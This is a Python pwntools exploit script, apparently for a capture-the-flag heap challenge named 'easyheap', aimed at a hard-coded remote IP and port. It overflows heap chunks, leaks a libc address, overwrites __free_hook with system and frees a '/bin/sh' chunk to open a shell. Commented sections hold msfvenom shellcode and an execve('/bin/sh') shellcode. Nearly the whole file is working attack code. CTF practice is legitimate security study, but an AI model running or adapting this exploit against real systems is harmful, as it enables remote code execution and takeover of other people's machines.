#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-07-08 17:54:18
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils,os,time
from pwn import *
from ctypes import *
# context(log_level="debug")
DEBUG = 0
target = "./easyheap"
remote_ip = "120.132.66.76"
port = 20010
rop = roputils.ROP(target)
elf = ELF(target)
# lib = cdll.LoadLibrary('./libc64.so')
# payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)
# libc = ELF[target]
# msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python
#buf =  ""
# buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
# buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"
# buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"
# buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"
# buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"
# buf += "\xfd\x10\xf9"

# int 0x80 linux x86 0x1c
# buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";


# bss = rop.section('.bss')
# rop.got('puts')
# rop.call('read', 0, addr_bss, 0x100)
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'

# def exec_fmt(payload):
# 	p = process(target)
# 	p.recvuntil("input:")
# 	p.sendline(payload)
# 	p.recvuntil("input:")
# 	p.sendline(payload)
# 	return p.recvuntil(",")[:-1]
# autofmt = FmtStr(exec_fmt)
# offset = autofmt.offset

# def send_payload(payload):
# 	sl(payload+"%100000c")
# autofmt = FmtStr(send_payload,offset=offset)

# autofmt.write(free_hook_addr,one_gadget_addr)
# autofmt.execute_writes()



if DEBUG:
	p = process(target)
	# gdb.attach(p,"b*main\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

def add(size,content):
	ru(":")
	sl("1")
	ru(":")
	sl(str(size))
	ru("\n")
	sd(content)
def edit(id,size,content):
	ru(":")
	sl("2")
	ru(":")
	sl(str(id))
	ru(":")
	sl(str(size))
	ru("\n")
	sd(content)
def lst():
	ru(":")
	sl("3")
def remove(id):
	ru(":")
	sl("4")
	ru(":")
	sl(str(id))

add(0x20,"a"*0x20)
add(0x1e0,p64(0x130)*60)
add(0x200,"\n") #index2
add(0x200,"\n") # index3
add(0x200,"\n") # index4
add(0x200,"\n") # index5
add(0x200,"\n") # index6
add(0x200,"\n") # index7

remove(1)
payload =  "a"*0x20+p64(0)+p64(0x20)+p64(0)*2+p64(0)+"\x30"
edit(0,len(payload),payload)
add(0x80,"\n") # index1
add(0x60,"\n") # index4
remove(1) 
remove(2) #index1
add(0x80,"\n") 
lst()
ru("id:1,size:128,content:")
data = ru("id:3,size:512,content:")[:-23]
heap_addr = u64(data.ljust(8,"\x00"))
print "heap_addr="+hex(heap_addr)
#remote
bin_offset = 0x3C4B78
#local
# bin_offset = 0x3C4C58
libc_base = heap_addr-bin_offset

libc = ELF("./libc.so.6")
# libc = ELF("./libc.so.o")
libc.address = libc_base
free_hook_offset = 0x00000000003c67a8
# free_hook_offset = 0x3c69a8
free_hook_addr = libc_base+free_hook_offset
system_addr = libc.symbols["system"]
payload = "/bin/sh"
payload +="\x00"*(0x200-len(payload))+p64(0)+p64(0x20)+p64(0x200)+p64(free_hook_addr)
# payload = "a"*0x200
edit(5,len(payload),payload)
payload = system_addr
edit(6,8,p64(system_addr))
remove(5)
# raw_input()
# edit(0,0x30,"a"*(0x))

p.interactive()